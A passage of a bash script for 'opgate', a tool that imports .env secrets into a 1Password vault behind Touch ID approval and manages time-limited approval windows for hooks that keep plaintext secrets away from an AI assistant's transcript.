  (( ${#vault_idx[@]} )) || die "no variables need to go to the vault"

  # Reserved field names must not be importable as variables: `opgate_source`
  # carries provenance and `notesPlain` is the Secure Note's required field.
  local i
  for (( i = 0; i < ${#OPG_NAMES[@]}; i++ )); do
    case "${OPG_NAMES[$i]}" in
      notesPlain|opgate_source) die "'${OPG_NAMES[$i]}' is an internal opgate field and cannot be used as a variable" ;;
    esac
    require_safe_var_name "${OPG_NAMES[$i]}"
  done

  # --- everything that can refuse, before the vault is touched or a prompt shown ---

  # Output file: named after its source so two files in one directory do not
  # overwrite each other, sink-checked like `inject`, and refused when a file
  # generated from a DIFFERENT source (or by hand) is already there.
  local base; base=$(basename -- "$file")
  local opfile; opfile="$(dirname -- "$file")/${base}.op"
  [[ "$base" == ".env" ]] && opfile="$(dirname -- "$file")/.env.op"
  local opreal; opreal=$(resolved_path "$opfile")
  assert_safe_sink "$opfile" "$opreal"
  if [[ -f "$opreal" ]] && (( ! force )); then
    # Both markers on purpose: the header used to be written in Vietnamese, and an
    # .env.op generated before that changed must still be recognised as ours rather
    # than reported as "not generated by opgate".
    local prev; prev=$(sed -n -e 's/^# source: //p' -e 's/^# nguồn: //p' "$opreal" | head -1)
    if [[ "$prev" != "${file#"$root"/}" ]]; then
      die "$opfile already exists$( [[ -n "$prev" ]] && printf ' (generated from %s)' "$prev" || printf ' and was not generated by opgate') — overwriting would lose it. Pass --force if you are sure."
    fi
  fi
  local optmp; optmp="${opreal}.tmp.$$"
  [[ -e "$optmp" || -L "$optmp" ]] && die "$optmp already exists — remove it first"

  # Ownership and collision, from metadata only. `op item list` returns title,
  # category and tags — no field values — so this pre-gate read exposes no
  # secret. Provenance is fetched alone with --fields; it holds a path, not a
  # secret. The full item is read only AFTER approval.
  local exists=0 meta
  meta=$(op item list --vault "$OPGATE_VAULT" --format json </dev/null 2>/dev/null \
         | jq -c --arg t "$item" '[.[] | select(.title == $t)] | .[0] // empty') || meta=""
  if [[ -n "$meta" ]]; then
    exists=1
    local owned; owned=$(printf '%s' "$meta" \
      | jq -r 'if (.category == "SECURE_NOTE" and ((.tags // []) | index("opgate"))) then "yes" else "no" end')
    [[ "$owned" == "yes" ]] \
      || die "item \"$item\" already exists in vault $OPGATE_VAULT but was not created by opgate
       (no 'opgate' tag, or not a Secure Note). Overwriting would drop its category,
       sections, URLs and passkeys. Use --item <another name>."

    local prev_src this_src="${file#"$root"/}"
    prev_src=$(op item get "$item" --vault "$OPGATE_VAULT" --fields label=opgate_source </dev/null 2>/dev/null || true)
    if [[ "$prev_src" != "$this_src" ]] && (( ! force )); then
      if [[ -n "$prev_src" ]]; then
        die "item \"$item\" already holds the secrets from $prev_src, and this is $this_src.
       Two different files derive the same item name. Use --item <another name>, or
       --force if you really do want them merged."
      else
        # No provenance: created before it was recorded. The collision it could
        # hide (a/b vs a-b) is exactly the one we cannot detect, so ask.
        die "item \"$item\" exists but records no source (created before that was tracked).
       There is no way to tell which file it belongs to. Pass --force if you are sure it is $this_src."
      fi
    fi
  fi

  # One approval for the whole file. Per-variable prompts would mean dozens of
  # Touch ID sheets for a real project, and a control you turn off is worth less
  # than one you keep. The sheet lists every variable being written.
  gate_require "import" "$item: $(IFS=,; printf '%s' "${vault_names[*]}")" \
    "$(project_name) → import ${file#"$root"/} into item \"$item\": $(summarize_list "${vault_names[@]}")$( (( exists )) && printf ' · merging into an existing item')"

  # --- approved: read the full item, merge, write vault, write .op ---
  local item_json
  if (( exists )); then
    item_json=$(op item get "$item" --vault "$OPGATE_VAULT" --format json </dev/null)
  else
    item_json=$(jq -n --arg t "$item" '{title: $t, category: "SECURE_NOTE", tags: [], fields: [
      {id: "notesPlain", type: "STRING", purpose: "NOTES", label: "notesPlain", value: ""}]}')
  fi

  item_json=$(printf '%s' "$item_json" | jq --arg s "${file#"$root"/}" '
    .fields = ((.fields // []) | map(select(.label != "opgate_source")))
            + [{id: "opgate_source", type: "STRING", label: "opgate_source", value: $s}]')

  # Values reach jq over a file descriptor, never argv.
  for i in ${vault_idx[@]+"${vault_idx[@]}"}; do
    item_json=$(printf '%s' "$item_json" \
      | jq --arg f "${OPG_NAMES[$i]}" --rawfile v <(printf '%s' "${OPG_VALUES[$i]}") '
          .fields = ((.fields // []) | map(select(.label != $f)))
                  + [{id: $f, type: "CONCEALED", label: $f, value: $v}]')
  done

  # Union the tags rather than replacing them: an edit template replaces the whole
  # item, so listing only our two would drop any tag you added by hand.
  item_json=$(printf '%s' "$item_json" | jq --arg p "project:$project" '
    .tags = (((.tags // []) + ["opgate", $p]) | unique)')

  if (( exists )); then
    op item edit "$item" --vault "$OPGATE_VAULT" --template <(printf '%s' "$item_json") </dev/null >/dev/null
    info "updating item \"$item\" (${#vault_idx[@]} variables)"
  else
    op item create --vault "$OPGATE_VAULT" --template <(printf '%s' "$item_json") </dev/null >/dev/null
    info "creating item \"$item\" (${#vault_idx[@]} variables), tags: opgate, project:$project"
  fi

  # Temporary file then mv, so an interrupted run leaves no half-written file.
  {
    printf '# generated by `opgate import`\n'
    printf '# source: %s\n' "${file#"$root"/}"
    printf '# safe to commit: op:// references and non-secret values only.\n'
    printf '# run: opgate run -f %s -- <cmd>\n\n' "$(basename -- "$opfile")"
    local j in_vault
    for (( i = 0; i < ${#OPG_NAMES[@]}; i++ )); do
      in_vault=0
      for j in ${vault_idx[@]+"${vault_idx[@]}"}; do [[ "$j" == "$i" ]] && in_vault=1; done
      if (( in_vault )); then
        printf '%s=op://%s/%s/%s\n' "${OPG_NAMES[$i]}" "$OPGATE_VAULT" "$item" "${OPG_NAMES[$i]}"
      else
        printf '%s=%s\n' "${OPG_NAMES[$i]}" "$(dotenv_quote "${OPG_VALUES[$i]}")"
      fi
    done
  } > "$optmp"
  chmod 644 "$optmp" 2>/dev/null || true
  mv -f -- "$optmp" "$opreal"
  info "ghi $opfile"

  if (( want_backup )); then
    local backup_dir="$OPGATE_HOME/backups"
    mkdir -p -- "$backup_dir"; chmod 700 "$backup_dir" 2>/dev/null || true
    local backup="$backup_dir/${item}-$(date +%Y%m%d-%H%M%S)-$$.env"
    ( umask 077; cp -- "$file" "$backup" )
    warn "plaintext backup: $backup — delete it once you no longer need it"
  fi

  if ! git check-ignore -q -- "$file" 2>/dev/null; then
    warn "$(basename -- "$file") is NOT git ignored — add it to .gitignore before committing"
  fi
  info "check it:  opgate run -f $opfile -- <cmd>"
  info "the original is untouched; delete it once you are sure everything works: rm $file"
}

cmd_items() {
  require_op
  local project=""
  while (( $# )); do
    case "$1" in
      -p|--project) [[ $# -ge 2 ]] || die "-p needs a name"; project="$2"; shift 2 ;;
      -h|--help) usage; exit 0 ;;
      *) die "opgate items: unknown argument '$1'" ;;
    esac
  done
  [[ -n "$project" ]] || project=$(project_name)
  printf 'vault %s · tag project:%s\n' "$OPGATE_VAULT" "$project"
  op item list --vault "$OPGATE_VAULT" --tags "project:$project" </dev/null 2>&1
}

# --- approval windows (layer 3 only) ----------------------------------------
#
# These do not touch the vault and cannot weaken the Touch ID gate. They control
# how often the PreToolUse guards re-ask about a plaintext file already sitting on
# your disk. See lib/grants.sh for why that is a different trade from OPGATE_TTL,
# which was removed.

cmd_unlock() {
  local minutes="$OPGATE_GRANT_DEFAULT_MINUTES" paths=()
  while (( $# )); do
    case "$1" in
      --minutes|-m) [[ $# -ge 2 ]] || die "--minutes needs a number"
                    require_int "$2" "--minutes"; minutes="$2"; shift 2 ;;
      -h|--help)    usage; exit 0 ;;
      --)           shift; paths+=("$@"); break ;;
      -*)           die "opgate unlock: unknown argument '$1'" ;;
      *)            paths+=("$1"); shift ;;
    esac
  done
  (( minutes >= 1 )) || die "--minutes must be >= 1"
  (( minutes <= OPGATE_GRANT_MAX_MINUTES )) \
    || die "--minutes caps at $OPGATE_GRANT_MAX_MINUTES ($(( OPGATE_GRANT_MAX_MINUTES / 60 ))h)"
  (( ${#paths[@]} )) || die "opgate unlock needs at least one path.
       On purpose: a window opens for the files you name, never for a whole project.
       Run \`opgate scan\` to see which secret files this project has."

  # Canonicalise first so the sheet names exactly what the guards will key on.
  local canons=() p c
  for p in "${paths[@]}"; do
    c=$(grant_canonical_path "$p" "$PWD") || die "cannot resolve path: $p"
    canons+=("$c")
  done

  # Gated, even though no secret value moves: it makes every window traceable to
  # one Touch ID, so a grant with no matching audit record is visible as a forgery.
  local list; list=$(printf '%s\n' "${canons[@]}")
  gate_require "unlock" "${minutes}m ${#canons[@]} file" \
    "Open a ${minutes}-minute window so the onepassword hook stops asking about:
$list"

  for c in "${canons[@]}"; do
    grant_open "$c" "$minutes" "unlock" "${CLAUDE_SESSION_ID:-cli}" \
      && ok "${minutes}m · $c" \
      || bad "could not open a window for $c"
  done
  info "\`opgate grants\` lists them, \`opgate lock\` closes them now."
}

cmd_lock() {
  # Tightening never needs approval.
  if (( $# == 0 )); then
    local n; n=$(grant_revoke_all)
    info "closed $n window(s)"
    return 0
  fi
  local p c rc=0
  for p in "$@"; do
    case "$p" in -h|--help) usage; exit 0 ;; esac
    c=$(grant_canonical_path "$p" "$PWD") || { bad "cannot resolve path: $p"; rc=1; continue; }
    if grant_revoke "$c"; then ok "closed · $c"; else bad "no open window for $c"; rc=1; fi
  done
  return "$rc"
}

cmd_grants() {
  local rows; rows=$(grant_list)
  if [[ -z "$rows" ]]; then
    info "no open windows — the guards will ask on the next read"
    return 0
  fi
  printf 'LEFT\tORIGIN\tFILE\n'
  local left origin path
  while IFS=$'\t' read -r left origin path; do
    [[ -n "$path" ]] || continue
    printf '%dm%02ds\t%s\t%s\n' $(( left / 60 )) $(( left % 60 )) "$origin" "$path"
  done <<<"$rows"
}

# --- dispatch ---------------------------------------------------------------

sub="${1:-help}"; shift || true
case "$sub" in
  unlock) cmd_unlock "$@" ;;
  lock)   cmd_lock   "$@" ;;
  grants) cmd_grants "$@" ;;
  run)    cmd_run    "$@" ;;
  exec)   cmd_exec   "$@" ;;
  inject) cmd_inject "$@" ;;
  copy)   cmd_copy   "$@" ;;
  put)    cmd_put    "$@" ;;
  list)   cmd_list   "$@" ;;
  scan)   cmd_scan   "$@" ;;
  import) cmd_import "$@" ;;
  items)  cmd_items  "$@" ;;
  audit)  cmd_audit  "$@" ;;
  doctor) cmd_doctor "$@" ;;
  build)  bash "$OPGATE_SCRIPT_DIR/build-gate.sh" ;;
  read)   die "opgate has no \`read\` command — deliberately. Printing a secret to stdout puts it in the model transcript.
       Use \`opgate run -- <cmd>\` (into a child env), \`opgate copy <ref>\` (clipboard), or \`opgate inject\` (a gitignored file)." ;;
  help|-h|--help) usage ;;
  *) printf 'opgate: unknown command "%s"\n\n' "$sub" >&2; usage; exit 64 ;;
esac
